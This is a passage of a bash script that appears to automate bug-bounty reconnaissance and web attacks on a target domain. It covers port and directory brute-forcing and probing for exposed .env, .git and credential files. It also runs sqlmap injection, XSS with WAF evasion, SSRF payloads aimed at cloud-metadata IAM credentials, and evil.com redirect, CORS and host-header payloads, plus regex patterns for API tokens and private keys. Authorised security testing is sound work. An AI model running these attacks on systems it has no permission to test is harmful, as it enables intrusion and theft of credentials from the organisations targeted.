            > "$OUTPUT_DIR/live/http/live_readable.txt"

        jq -r '.url' "$OUTPUT_DIR/live/http/httpx_full.json" 2>/dev/null \
            | sort -u > "$OUTPUT_DIR/live/http/live_urls.txt"

        for code in 200 301 302 401 403 404 500 502 503; do
            jq -r "select(.status_code==$code) | .url" \
                "$OUTPUT_DIR/live/http/httpx_full.json" 2>/dev/null \
                > "$OUTPUT_DIR/live/http/status_${code}.txt"
        done

        jq -r '.url' "$OUTPUT_DIR/live/http/httpx_full.json" 2>/dev/null \
            | grep -iE "dev|staging|test|uat|qa|demo|beta|admin|internal|corp|vpn|api|portal|jenkins|jira|gitlab|confluence|kibana|grafana|prometheus|elastic|solr|redis|mongo|mysql|phpmyadmin|swagger|api-docs" \
            > "$OUTPUT_DIR/live/interesting/interesting_subdomains.txt"

        INTERESTING=$(wc -l < "$OUTPUT_DIR/live/interesting/interesting_subdomains.txt")
        if [ "$INTERESTING" -gt 0 ]; then
            finding "HIGH" "Interesting Subdomains Detected" "$TARGET" \
                "$INTERESTING subdomains with sensitive names" \
                "See $OUTPUT_DIR/live/interesting/interesting_subdomains.txt" \
                "Ensure these are not publicly accessible or have strong authentication"
        fi

        LIVE_COUNT=$(wc -l < "$OUTPUT_DIR/live/http/live_urls.txt")
        ok "Live hosts: $LIVE_COUNT"
    fi

    if check_tool cdncheck; then
        info "CDN detection..."
        cdncheck -l "$OUTPUT_DIR/live/http/live_urls.txt" -silent \
            > "$OUTPUT_DIR/live/http/cdn_status.txt" 2>/dev/null
    fi

    if check_tool wafw00f; then
        info "WAF detection..."
        wafw00f "https://$TARGET" 2>/dev/null > "$OUTPUT_DIR/live/http/waf.txt"
        WAF=$(grep -i "is behind" "$OUTPUT_DIR/live/http/waf.txt" | head -1)
        ok "WAF: $WAF"
    fi

    if check_tool gowitness; then
        info "Taking screenshots of live hosts..."
        gowitness file -f "$OUTPUT_DIR/live/http/live_urls.txt" \
            --screenshot-path "$OUTPUT_DIR/screenshots/" \
            --disable-db 2>/dev/null
        ok "Screenshots saved"
    fi
}

phase_port_scan() {
    section "PHASE 4 — PORT SCANNING & SERVICE DETECTION"

    TARGET_IP=$(dig +short A "$TARGET" | head -1)
    if [ -z "$TARGET_IP" ]; then
        warn "No IP resolved for $TARGET"
        return
    fi
    ok "Target IP: $TARGET_IP"

    if check_tool naabu; then
        info "Naabu full port scan (top 1000)..."
        naabu -host "$TARGET_IP" \
            -top-ports 1000 \
            -silent \
            -rate 1000 \
            -o "$OUTPUT_DIR/ports/naabu/open_ports.txt" 2>/dev/null
        ok "Open ports: $(wc -l < "$OUTPUT_DIR/ports/naabu/open_ports.txt")"
    fi

    if check_tool nmap; then
        info "Nmap service/version detection..."
        PORTS_CSV=$(cat "$OUTPUT_DIR/ports/naabu/open_ports.txt" 2>/dev/null \
            | cut -d: -f2 | tr '\n' ',' | sed 's/,$//')
        nmap -sV -sC -T4 \
            -p "$PORTS_CSV" \
            --script "banner,version,vuln,auth,default" \
            -oN "$OUTPUT_DIR/ports/nmap/nmap_detailed.txt" \
            -oX "$OUTPUT_DIR/ports/nmap/nmap.xml" \
            "$TARGET_IP" 2>/dev/null

        for port_service in "3306:MySQL" "5432:PostgreSQL" "27017:MongoDB" "6379:Redis" "9200:Elasticsearch" "5984:CouchDB" "11211:Memcached"; do
            PORT="${port_service%%:*}"
            SVC="${port_service#*:}"
            if grep -q "$PORT/open" "$OUTPUT_DIR/ports/nmap/nmap_detailed.txt" 2>/dev/null; then
                finding "CRITICAL" "Database Service Exposed" "$TARGET_IP:$PORT" \
                    "$SVC port $PORT is publicly accessible" \
                    "nmap found port $PORT open on $TARGET_IP" \
                    "Place $SVC behind firewall. Never expose database ports to public internet."
            fi
        done

        if grep -qE "21/open.*ftp" "$OUTPUT_DIR/ports/nmap/nmap_detailed.txt" 2>/dev/null; then
            finding "HIGH" "FTP Service Exposed" "$TARGET_IP:21" \
                "FTP port 21 is open — check for anonymous login" \
                "nmap detected FTP on port 21" \
                "Disable FTP, switch to SFTP."
        fi

        if grep -qE "23/open.*telnet" "$OUTPUT_DIR/ports/nmap/nmap_detailed.txt" 2>/dev/null; then
            finding "CRITICAL" "Telnet Exposed" "$TARGET_IP:23" \
                "Telnet port 23 is open — cleartext protocol" \
                "nmap detected telnet on port 23" \
                "Disable telnet immediately. Use SSH instead."
        fi

        ok "Nmap scan complete"
    fi
}

phase_endpoint_discovery() {
    section "PHASE 5 — ENDPOINT & CONTENT DISCOVERY"

    BASE_URL="https://$TARGET"

    if check_tool katana; then
        info "Katana JS-aware deep crawl..."
        katana -u "$BASE_URL" \
            -d 5 \
            -jc \
            -kf all \
            -silent \
            -o "$OUTPUT_DIR/endpoints/dirs/katana.txt" 2>/dev/null
        ok "Katana: $(wc -l < "$OUTPUT_DIR/endpoints/dirs/katana.txt") URLs"
    fi

    if check_tool hakrawler; then
        info "Hakrawler..."
        echo "$BASE_URL" | hakrawler -d 3 -subs \
            > "$OUTPUT_DIR/endpoints/dirs/hakrawler.txt" 2>/dev/null
        ok "Hakrawler: $(wc -l < "$OUTPUT_DIR/endpoints/dirs/hakrawler.txt") URLs"
    fi

    if check_tool gospider; then
        info "GoSpider..."
        gospider -s "$BASE_URL" -d 3 -t 10 --sitemap --robots \
            -o "$OUTPUT_DIR/endpoints/dirs/gospider_raw/" 2>/dev/null
        cat "$OUTPUT_DIR/endpoints/dirs/gospider_raw/"* 2>/dev/null \
            | grep -oP 'https?://[^\s"]+' \
            | sort -u > "$OUTPUT_DIR/endpoints/dirs/gospider.txt"
    fi

    FFUF_WL="$HOME/SecLists/Discovery/Web-Content/raft-large-directories.txt"
    [ ! -f "$FFUF_WL" ] && FFUF_WL="$HOME/SecLists/Discovery/Web-Content/common.txt"
    if check_tool ffuf && [ -f "$FFUF_WL" ]; then
        info "FFUF directory bruteforce..."
        ffuf -u "$BASE_URL/FUZZ" \
            -w "$FFUF_WL" \
            -mc 200,204,301,302,307,401,403,405 \
            -t "$THREADS" \
            -rate "$RATE_LIMIT" \
            -of json \
            -o "$OUTPUT_DIR/endpoints/dirs/ffuf_dirs.json" \
            -s 2>/dev/null

        info "FFUF backup file detection..."
        ffuf -u "$BASE_URL/FUZZ" \
            -w "$HOME/SecLists/Discovery/Web-Content/backups.txt" \
            -mc 200,301,302 \
            -t 30 -of json \
            -o "$OUTPUT_DIR/endpoints/backup/ffuf_backup.json" \
            -s 2>/dev/null

        info "FFUF API version discovery..."
        ffuf -u "$BASE_URL/FUZZ/users" \
            -w "$HOME/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt" \
            -mc 200,201,204,301 \
            -t 30 -of json \
            -o "$OUTPUT_DIR/endpoints/api/ffuf_api.json" \
            -s 2>/dev/null
    fi

    if check_tool ffuf; then
        VHOST_WL="$HOME/SecLists/Discovery/DNS/subdomains-top1million-5000.txt"
        if [ -f "$VHOST_WL" ]; then
            info "FFUF virtual host bruteforce..."
            BASE_SIZE=$(curl -sk -o /dev/null -w "%{size_body}" "https://$TARGET")
            ffuf -u "https://$TARGET" \
                -H "Host: FUZZ.$TARGET" \
                -w "$VHOST_WL" \
                -mc 200,301,302,401,403 \
                -fs "$BASE_SIZE" \
                -t 30 \
                -of json \
                -o "$OUTPUT_DIR/endpoints/dirs/ffuf_vhosts.json" \
                -s 2>/dev/null
            ok "VHost scan done"
        fi
    fi

    cat "$OUTPUT_DIR/endpoints/dirs/"*.txt \
        "$OUTPUT_DIR/endpoints/params/wayback.txt" \
        2>/dev/null \
        | grep -oP 'https?://[^\s"<>]+' \
        | sort -u > "$OUTPUT_DIR/endpoints/ALL_URLS_RAW.txt"

    if check_tool uro; then
        uro < "$OUTPUT_DIR/endpoints/ALL_URLS_RAW.txt" \
            > "$OUTPUT_DIR/endpoints/ALL_URLS_DEDUPED.txt" 2>/dev/null
        ok "Deduped URLs: $(wc -l < "$OUTPUT_DIR/endpoints/ALL_URLS_DEDUPED.txt")"
    else
        cp "$OUTPUT_DIR/endpoints/ALL_URLS_RAW.txt" "$OUTPUT_DIR/endpoints/ALL_URLS_DEDUPED.txt"
    fi

    info "Checking for sensitive exposed files..."
    declare -A SENSITIVE
    SENSITIVE["/.env"]="CRITICAL:Environment file — may contain DB passwords, API keys"
    SENSITIVE["/.git/HEAD"]="CRITICAL:Git repository exposed — source code disclosure"
    SENSITIVE["/.git/config"]="CRITICAL:Git config exposed"
    SENSITIVE["/.svn/entries"]="HIGH:SVN repository exposed"
    SENSITIVE["/.DS_Store"]="MEDIUM:MacOS metadata — reveals directory structure"
    SENSITIVE["/.htpasswd"]="CRITICAL:Apache password file exposed"
    SENSITIVE["/.htaccess"]="MEDIUM:Apache config file exposed"
    SENSITIVE["/config.php"]="HIGH:PHP config file — may contain DB credentials"
    SENSITIVE["/config.js"]="HIGH:JS config — may contain API keys"
    SENSITIVE["/config.json"]="HIGH:JSON config — may contain secrets"
    SENSITIVE["/wp-config.php"]="CRITICAL:WordPress config — contains DB credentials"
    SENSITIVE["/wp-config.php.bak"]="CRITICAL:WordPress config backup"
    SENSITIVE["/database.yml"]="CRITICAL:Rails DB config"
    SENSITIVE["/settings.py"]="HIGH:Django settings"
    SENSITIVE["/phpinfo.php"]="HIGH:PHP info page — server information disclosure"
    SENSITIVE["/info.php"]="HIGH:PHP info page"
    SENSITIVE["/server-status"]="MEDIUM:Apache server-status"
    SENSITIVE["/elmah.axd"]="HIGH:.NET ELMAH error log"
    SENSITIVE["/web.config"]="HIGH:.NET web.config"
    SENSITIVE["/robots.txt"]="INFO:robots.txt — reveals hidden paths"
    SENSITIVE["/sitemap.xml"]="INFO:Sitemap — reveals all pages"
    SENSITIVE["/swagger.json"]="HIGH:Swagger API docs — full API disclosure"
    SENSITIVE["/swagger-ui.html"]="HIGH:Swagger UI"
    SENSITIVE["/api/swagger"]="HIGH:Swagger API docs"
    SENSITIVE["/api-docs"]="HIGH:API documentation"
    SENSITIVE["/openapi.json"]="HIGH:OpenAPI spec"
    SENSITIVE["/graphql"]="MEDIUM:GraphQL endpoint"
    SENSITIVE["/graphiql"]="HIGH:GraphiQL interface"
    SENSITIVE["/.aws/credentials"]="CRITICAL:AWS credentials file"
    SENSITIVE["/backup.zip"]="CRITICAL:Site backup archive"
    SENSITIVE["/backup.tar.gz"]="CRITICAL:Site backup archive"
    SENSITIVE["/db.sql"]="CRITICAL:SQL database dump"
    SENSITIVE["/dump.sql"]="CRITICAL:SQL database dump"
    SENSITIVE["/.npmrc"]="HIGH:NPM config — may contain registry tokens"
    SENSITIVE["/.docker/config.json"]="CRITICAL:Docker config"
    SENSITIVE["/docker-compose.yml"]="HIGH:Docker Compose config"
    SENSITIVE["/Jenkinsfile"]="MEDIUM:Jenkins pipeline config"
    SENSITIVE["/.travis.yml"]="MEDIUM:CI/CD config"
    SENSITIVE["/package.json"]="INFO:NPM package info"
    SENSITIVE["/requirements.txt"]="INFO:Python requirements"

    for path in "${!SENSITIVE[@]}"; do
        IFS=':' read -r SEV_CODE DESC <<< "${SENSITIVE[$path]}"
        HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
            --max-time 10 "https://$TARGET$path" 2>/dev/null)
        if [[ "$HTTP_CODE" =~ ^(200|301|302|403)$ ]]; then
            CONTENT=$(curl -sk --max-time 10 "https://$TARGET$path" 2>/dev/null | head -5)
            finding "$SEV_CODE" "Sensitive File Exposed" "https://$TARGET$path" \
                "HTTP $HTTP_CODE — $DESC" \
                "curl -sk https://$TARGET$path  Response: $HTTP_CODE  Preview: ${CONTENT:0:100}" \
                "Remove or protect file via server config."
        fi
    done

    info "Finding login and admin panels..."
    ADMIN_PATHS=(
        "/admin" "/administrator" "/admin.php" "/admin/login"
        "/wp-admin" "/wp-login.php" "/wp-admin/admin.php"
        "/login" "/signin" "/portal" "/panel" "/cpanel"
        "/phpmyadmin" "/pma" "/mysqladmin"
        "/manager/html" "/manager" "/management"
        "/dashboard" "/console" "/control"
        "/staff" "/employee" "/internal"
        "/cms" "/backend" "/backoffice"
        "/user/login" "/account/login" "/auth/login"
        "/api/admin" "/api/console"
    )
    for ap in "${ADMIN_PATHS[@]}"; do
        CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
            --max-time 8 "https://$TARGET$ap" 2>/dev/null)
        if [[ "$CODE" =~ ^(200|301|302|401|403)$ ]]; then
            echo "[$CODE] https://$TARGET$ap" >> "$OUTPUT_DIR/endpoints/admin/admin_panels.txt"
        fi
    done
    ADMIN_COUNT=$(wc -l < "$OUTPUT_DIR/endpoints/admin/admin_panels.txt" 2>/dev/null || echo 0)
    if [ "$ADMIN_COUNT" -gt 0 ]; then
        finding "MEDIUM" "Admin/Login Panels Found" "$TARGET" \
            "$ADMIN_COUNT admin/login panels discovered" \
            "$(cat "$OUTPUT_DIR/endpoints/admin/admin_panels.txt" 2>/dev/null)" \
            "Ensure strong authentication (MFA) on all admin panels."
    fi
}

phase_js_analysis() {
    section "PHASE 6 — JAVASCRIPT DEEP ANALYSIS"

    BASE_URL="https://$TARGET"

    info "Collecting JavaScript files..."
    grep "\.js$" "$OUTPUT_DIR/endpoints/ALL_URLS_DEDUPED.txt" 2>/dev/null \
        | sort -u > "$OUTPUT_DIR/js/files/js_list.txt"

    if check_tool getJS; then
        getJS --url "$BASE_URL" --complete \
            >> "$OUTPUT_DIR/js/files/js_list.txt" 2>/dev/null
    fi

    while IFS= read -r url; do
        if check_tool getJS; then
            getJS --url "$url" --complete \
                >> "$OUTPUT_DIR/js/files/js_list.txt" 2>/dev/null
        fi
    done < "$OUTPUT_DIR/live/http/status_200.txt" 2>/dev/null

    sort -u "$OUTPUT_DIR/js/files/js_list.txt" -o "$OUTPUT_DIR/js/files/js_list.txt"
    ok "JS files: $(wc -l < "$OUTPUT_DIR/js/files/js_list.txt")"

    if check_tool jsluice; then
        info "Analyzing JS with jsluice (BishopFox)..."
        while IFS= read -r jsurl; do
            [ -z "$jsurl" ] && continue
            JSFILE=$(curl -sk --max-time 15 "$jsurl" 2>/dev/null)
            echo "$JSFILE" | jsluice urls 2>/dev/null \
                >> "$OUTPUT_DIR/js/endpoints/jsluice_urls.txt"
            echo "$JSFILE" | jsluice secrets 2>/dev/null \
                >> "$OUTPUT_DIR/js/secrets/jsluice_secrets.json"
        done < "$OUTPUT_DIR/js/files/js_list.txt"
        ok "jsluice done"
    fi

    info "Regex-based secret hunting in JS files..."
    declare -A SECRET_PATTERNS
    SECRET_PATTERNS["AWS Access Key"]='AKIA[0-9A-Z]{16}'
    SECRET_PATTERNS["Google API Key"]='AIza[0-9A-Za-z\-_]{35}'
    SECRET_PATTERNS["Stripe API Key"]='sk_live_[0-9a-zA-Z]{24}'
    SECRET_PATTERNS["Stripe Publishable"]='pk_live_[0-9a-zA-Z]{24}'
    SECRET_PATTERNS["GitHub Token"]='ghp_[0-9a-zA-Z]{36}'
    SECRET_PATTERNS["GitLab Token"]='glpat-[0-9a-zA-Z\-_]{20}'
    SECRET_PATTERNS["Slack Token"]='xox[baprs]-([0-9a-zA-Z]{10,48})'
    SECRET_PATTERNS["Slack Webhook"]='https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+'
    SECRET_PATTERNS["Twilio"]='SK[0-9a-fA-F]{32}'
    SECRET_PATTERNS["SendGrid"]='SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}'
    SECRET_PATTERNS["Private Key"]='-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY'
    SECRET_PATTERNS["JWT"]='eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    SECRET_PATTERNS["Generic Secret"]='(secret|password|passwd|pwd)["\s:=]+["\x27][^"\x27\s]{8,}'

    while IFS= read -r jsurl; do
        [ -z "$jsurl" ] && continue
        CONTENT=$(curl -sk --max-time 15 "$jsurl" 2>/dev/null)
        for pattern_name in "${!SECRET_PATTERNS[@]}"; do
            MATCHES=$(echo "$CONTENT" | grep -oP "${SECRET_PATTERNS[$pattern_name]}" 2>/dev/null)
            if [ -n "$MATCHES" ]; then
                echo "[$pattern_name] SOURCE: $jsurl" >> "$OUTPUT_DIR/js/secrets/all_secrets.txt"
                echo "$MATCHES" >> "$OUTPUT_DIR/js/secrets/all_secrets.txt"
                echo "" >> "$OUTPUT_DIR/js/secrets/all_secrets.txt"
                finding "CRITICAL" "Secret/Credential in JS File" "$jsurl" \
                    "$pattern_name found in JS file" \
                    "Pattern matched in: $jsurl" \
                    "Rotate compromised credentials immediately. Never hardcode secrets in frontend code."
            fi
        done

        echo "$CONTENT" | grep -oP '["\x27`](/api/[^"\x27`\s]{2,})[`\x27"]' \
            | tr -d '"'"'" >> "$OUTPUT_DIR/js/endpoints/relative_endpoints.txt"
    done < "$OUTPUT_DIR/js/files/js_list.txt"

    sort -u "$OUTPUT_DIR/js/endpoints/relative_endpoints.txt" \
        -o "$OUTPUT_DIR/js/endpoints/relative_endpoints.txt" 2>/dev/null

    info "Checking for exposed source maps..."
    while IFS= read -r jsurl; do
        MAP_URL="${jsurl}.map"
        CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$MAP_URL" 2>/dev/null)
        if [ "$CODE" = "200" ]; then
            echo "$MAP_URL" >> "$OUTPUT_DIR/js/sourcemaps/found_sourcemaps.txt"
            finding "HIGH" "Source Map Exposed" "$MAP_URL" \
                "JavaScript source map is publicly accessible — original source code recoverable" \
                "curl -sk $MAP_URL | head -5" \
                "Remove .map files from production."
        fi
    done < "$OUTPUT_DIR/js/files/js_list.txt"

    ok "JS analysis complete"
}

phase_param_discovery() {
    section "PHASE 7 — PARAMETER DISCOVERY"

    if check_tool arjun; then
        info "Arjun hidden parameter discovery..."
        head -20 "$OUTPUT_DIR/live/http/status_200.txt" 2>/dev/null | while read -r url; do
            arjun -u "$url" \
                --rate-limit 10 \
                --passive \
                -oJ "$OUTPUT_DIR/endpoints/params/arjun_$(echo "$url" | md5sum | cut -c1-8).json" \
                2>/dev/null
        done
        ok "Arjun complete"
    fi

    if check_tool x8; then
        info "x8 hidden parameter scanner..."
        head -10 "$OUTPUT_DIR/live/http/status_200.txt" 2>/dev/null | while read -r url; do
            x8 -u "${url}?FUZZ=test" \
                -w "$HOME/SecLists/Discovery/Web-Content/burp-parameter-names.txt" \
                -o "$OUTPUT_DIR/endpoints/params/x8_$(echo "$url" | md5sum | cut -c1-8).txt" \
                2>/dev/null
        done
    fi

    if check_tool gf; then
        info "Applying GF patterns..."
        declare -A GF_PATTERNS
        GF_PATTERNS["xss"]="$OUTPUT_DIR/vulnerabilities/xss/gf_xss_candidates.txt"
        GF_PATTERNS["sqli"]="$OUTPUT_DIR/vulnerabilities/sqli/gf_sqli_candidates.txt"
        GF_PATTERNS["lfi"]="$OUTPUT_DIR/vulnerabilities/lfi/gf_lfi_candidates.txt"
        GF_PATTERNS["ssrf"]="$OUTPUT_DIR/vulnerabilities/ssrf/gf_ssrf_candidates.txt"
        GF_PATTERNS["redirect"]="$OUTPUT_DIR/vulnerabilities/open_redirect/gf_redirect_candidates.txt"
        GF_PATTERNS["rce"]="$OUTPUT_DIR/vulnerabilities/rce/gf_rce_candidates.txt"
        GF_PATTERNS["idor"]="$OUTPUT_DIR/vulnerabilities/idor/gf_idor_candidates.txt"
        GF_PATTERNS["ssti"]="$OUTPUT_DIR/vulnerabilities/rce/gf_ssti_candidates.txt"
        GF_PATTERNS["cors"]="$OUTPUT_DIR/vulnerabilities/cors/gf_cors_candidates.txt"

        for pattern in "${!GF_PATTERNS[@]}"; do
            gf "$pattern" "$OUTPUT_DIR/endpoints/ALL_URLS_DEDUPED.txt" \
                > "${GF_PATTERNS[$pattern]}" 2>/dev/null
            COUNT=$(wc -l < "${GF_PATTERNS[$pattern]}" 2>/dev/null || echo 0)
            [ "$COUNT" -gt 0 ] && ok "GF $pattern: $COUNT candidates"
        done
    fi
}

phase_subdomain_takeover() {
    section "PHASE 8 — SUBDOMAIN TAKEOVER"

    if check_tool subzy; then
        info "Subzy subdomain takeover check..."
        subzy run \
            --targets "$OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt" \
            --concurrency 50 \
            --hide-fails \
            > "$OUTPUT_DIR/vulnerabilities/subdomain_takeover/subzy.txt" 2>/dev/null
        SUBZY_HIT=$(grep -c "VULNERABLE" "$OUTPUT_DIR/vulnerabilities/subdomain_takeover/subzy.txt" 2>/dev/null || echo 0)
        if [ "$SUBZY_HIT" -gt 0 ]; then
            while IFS= read -r line; do
                VULN_SUB=$(echo "$line" | grep -oP "[a-zA-Z0-9.\-]+\.$TARGET")
                finding "HIGH" "Subdomain Takeover" "$VULN_SUB" \
                    "Subdomain CNAME points to unclaimed/expired third-party service" \
                    "subzy: $line" \
                    "Claim the third-party service or remove the CNAME DNS record."
            done < <(grep "VULNERABLE" "$OUTPUT_DIR/vulnerabilities/subdomain_takeover/subzy.txt")
        fi
    fi

    if check_tool subjack; then
        info "Subjack subdomain takeover check..."
        subjack \
            -w "$OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt" \
            -t 50 -ssl \
            -o "$OUTPUT_DIR/vulnerabilities/subdomain_takeover/subjack.txt" 2>/dev/null
    fi

    info "Manual CNAME takeover detection..."
    TAKEOVER_SERVICES=(
        "amazonaws.com:AWS S3"
        "github.io:GitHub Pages"
        "herokuapp.com:Heroku"
        "azurewebsites.net:Azure"
        "shopify.com:Shopify"
        "wpengine.com:WP Engine"
        "surge.sh:Surge"
        "bitbucket.io:Bitbucket"
        "pantheon.io:Pantheon"
        "fastly.net:Fastly"
        "statuspage.io:Statuspage"
        "zendesk.com:Zendesk"
        "ghost.io:Ghost"
        "readthedocs.io:ReadTheDocs"
    )

    while IFS= read -r sub; do
        CNAME=$(dig +short CNAME "$sub" 2>/dev/null | tail -1)
        [ -z "$CNAME" ] && continue
        for svc_entry in "${TAKEOVER_SERVICES[@]}"; do
            SVC_DOMAIN="${svc_entry%%:*}"
            SVC_NAME="${svc_entry#*:}"
            if echo "$CNAME" | grep -qi "$SVC_DOMAIN"; then
                HTTP=$(curl -sk -o /dev/null -w "%{http_code}" "https://$sub" 2>/dev/null)
                BODY=$(curl -sk "https://$sub" 2>/dev/null)
                if [[ "$HTTP" =~ ^(404|000|503)$ ]] || \
                   echo "$BODY" | grep -qiE "no such app|doesn't exist|not found|repository not found|there isn't a github pages"; then
                    finding "HIGH" "Subdomain Takeover — $SVC_NAME" "$sub" \
                        "$sub CNAME points to $CNAME ($SVC_NAME) — appears unclaimed (HTTP $HTTP)" \
                        "dig CNAME $sub -> $CNAME | HTTP status: $HTTP" \
                        "Claim $CNAME on $SVC_NAME platform, OR remove the CNAME DNS record."
                fi
            fi
        done
    done < "$OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt" 2>/dev/null
    ok "Subdomain takeover check done"
}

phase_vuln_scan() {
    section "PHASE 9 — VULNERABILITY SCANNING"

    BASE_URL="https://$TARGET"

    # ── XSS ──
    info "XSS Testing..."
    if check_tool kxss; then
        cat "$OUTPUT_DIR/vulnerabilities/xss/gf_xss_candidates.txt" 2>/dev/null \
            | kxss > "$OUTPUT_DIR/vulnerabilities/xss/kxss_reflected.txt" 2>/dev/null
        while IFS= read -r line; do
            URL=$(echo "$line" | grep -oP 'https?://[^\s]+')
            CHARS=$(echo "$line" | grep -oP 'Possible.*')
            if [ -n "$URL" ]; then
                finding "HIGH" "Reflected XSS Candidate" "$URL" \
                    "Special characters reflected without encoding — $CHARS" \
                    "kxss output: $line" \
                    "Encode all user input on output. Implement CSP."
            fi
        done < "$OUTPUT_DIR/vulnerabilities/xss/kxss_reflected.txt"
    fi

    if check_tool dalfox; then
        info "Dalfox XSS confirmation..."
        cat "$OUTPUT_DIR/vulnerabilities/xss/gf_xss_candidates.txt" 2>/dev/null \
            | head -100 \
            | dalfox pipe \
                --silence \
                --no-color \
                --skip-bav \
                --waf-evasion \
                --output "$OUTPUT_DIR/vulnerabilities/xss/dalfox_confirmed.txt" \
                2>/dev/null
        while IFS= read -r line; do
            if echo "$line" | grep -q "\[V\]"; then
                URL=$(echo "$line" | grep -oP 'https?://[^\s"]+')
                PAYLOAD=$(echo "$line" | grep -oP '\[V\].*')
                finding "HIGH" "Confirmed XSS — Dalfox" "$URL" \
                    "Cross-Site Scripting confirmed by Dalfox" \
                    "Dalfox: $PAYLOAD" \
                    "Sanitize and encode all user-supplied input. Use CSP headers."
            fi
        done < "$OUTPUT_DIR/vulnerabilities/xss/dalfox_confirmed.txt"
    fi

    # ── SQLi ──
    info "SQL Injection testing..."
    if check_tool sqlmap; then
        head -20 "$OUTPUT_DIR/vulnerabilities/sqli/gf_sqli_candidates.txt" 2>/dev/null \
        | while IFS= read -r url; do
            SQLMAP_OUT=$(sqlmap -u "$url" \
                --batch --level=3 --risk=2 \
                --random-agent --timeout=20 \
                --output-dir="$OUTPUT_DIR/vulnerabilities/sqli/sqlmap/" \
                2>/dev/null)
            if echo "$SQLMAP_OUT" | grep -qi "is vulnerable"; then
                PARAM=$(echo "$SQLMAP_OUT" | grep -oP "parameter '[^']+' is vulnerable" | head -1)
                DBMS=$(echo "$SQLMAP_OUT" | grep -oP "DBMS: [^\n]+" | head -1)
                finding "CRITICAL" "SQL Injection Confirmed" "$url" \
                    "SQLi confirmed — $PARAM | $DBMS" \
                    "sqlmap -u '$url' --batch --level=3 --risk=2" \
                    "Use parameterized queries. Never concatenate user input into SQL."
            fi
        done
    fi

    # ── SSRF ──
    info "SSRF testing..."
    SSRF_PAYLOADS=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://100.100.100.200/latest/meta-data/"
        "http://192.168.0.1"
        "http://localhost"
        "http://127.0.0.1"
    )
    while IFS= read -r url; do
        for payload in "${SSRF_PAYLOADS[@]}"; do
            RESP=$(curl -sk --max-time 10 "${url}${payload}" 2>/dev/null)
            if echo "$RESP" | grep -qiE "ami-id|instance-id|security-credentials|iam/security"; then
                finding "CRITICAL" "SSRF to Cloud Metadata" "$url" \
                    "SSRF payload returned AWS/GCP metadata — possible credential theft" \
                    "curl '$url$payload'  Response contains cloud metadata" \
                    "Block SSRF via allowlist-only outbound requests. Block 169.254.x.x at network level."
            fi
        done
    done < "$OUTPUT_DIR/vulnerabilities/ssrf/gf_ssrf_candidates.txt" 2>/dev/null

    # ── Open Redirect ──
    info "Open Redirect testing..."
    REDIRECT_PAYLOADS=(
        "https://evil.com"
        "//evil.com"
        "//evil.com%2f%2e%2e"
        "%0d%0ahttps://evil.com"
        "/%09/evil.com"
        "/\/evil.com"
    )
    while IFS= read -r url; do
        for payload in "${REDIRECT_PAYLOADS[@]}"; do
            TEST_URL=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "${url}${payload}")
            FINAL_URL=$(curl -sk -o /dev/null -w "%{redirect_url}" \
                --max-time 10 "$TEST_URL" 2>/dev/null)
            if echo "$FINAL_URL" | grep -q "evil.com"; then
                finding "MEDIUM" "Open Redirect Confirmed" "$url" \
                    "Redirect to external domain via payload: $payload" \
                    "curl -sk -I '$TEST_URL' -> Location: $FINAL_URL" \
                    "Validate and allowlist redirect URLs."
            fi
        done
    done < "$OUTPUT_DIR/vulnerabilities/open_redirect/gf_redirect_candidates.txt" 2>/dev/null

    # ── CRLF ──
    if check_tool crlfuzz; then
        info "CRLF Injection testing..."
        crlfuzz -l "$OUTPUT_DIR/live/http/live_urls.txt" \
            -s \
            > "$OUTPUT_DIR/vulnerabilities/cve/crlf_results.txt" 2>/dev/null
        while IFS= read -r line; do
            URL=$(echo "$line" | grep -oP 'https?://[^\s]+')
            if [ -n "$URL" ]; then
                finding "MEDIUM" "CRLF Injection" "$URL" \
                    "CRLF injection possible — HTTP header injection risk" \
                    "crlfuzz: $line" \
                    "Strip CR and LF from all user-supplied inputs in HTTP headers."
            fi
        done < "$OUTPUT_DIR/vulnerabilities/cve/crlf_results.txt"
    fi

    # ── CORS ──
    if check_tool corsme; then
        info "CORS misconfiguration testing..."
        corsme -u "https://$TARGET" \
            > "$OUTPUT_DIR/vulnerabilities/cors/corsme.txt" 2>/dev/null
    fi

    info "Manual CORS header analysis..."
    while IFS= read -r url; do
        CORS_RESP=$(curl -sk -I \
            -H "Origin: https://evil.com" \
            -H "Access-Control-Request-Method: GET" \
            --max-time 10 "$url" 2>/dev/null)
        ACAO=$(echo "$CORS_RESP" | grep -i "access-control-allow-origin" | tr -d '\r')
        ACAC=$(echo "$CORS_RESP" | grep -i "access-control-allow-credentials" | tr -d '\r')
        if echo "$ACAO" | grep -qiE "evil\.com|\*"; then
            if echo "$ACAC" | grep -qi "true" && ! echo "$ACAO" | grep -q "\*"; then
                finding "HIGH" "CORS + Credentials Misconfiguration" "$url" \
                    "Origin:evil.com reflected AND Access-Control-Allow-Credentials:true" \
                    "curl -sk -I -H 'Origin: https://evil.com' $url  ->  $ACAO | $ACAC" \
                    "Validate origin against strict allowlist. Never use wildcard with allow-credentials:true."
            else
                finding "MEDIUM" "CORS Misconfiguration" "$url" \
                    "Access-Control-Allow-Origin reflects attacker-controlled origin" \
                    "curl -sk -I -H 'Origin: https://evil.com' $url  ->  $ACAO" \
                    "Implement strict origin allowlist."
            fi
        fi
    done < "$OUTPUT_DIR/live/http/live_urls.txt" 2>/dev/null

    # ── Host Header Injection ──
    info "Host Header Injection testing..."
    HHI_PAYLOADS=(
        "evil.com"
        "$TARGET.evil.com"
        "evil.com:80"
    )
    for payload in "${HHI_PAYLOADS[@]}"; do
        RESP=$(curl -sk -I \
            -H "Host: $payload" \
            -H "X-Forwarded-Host: evil.com" \
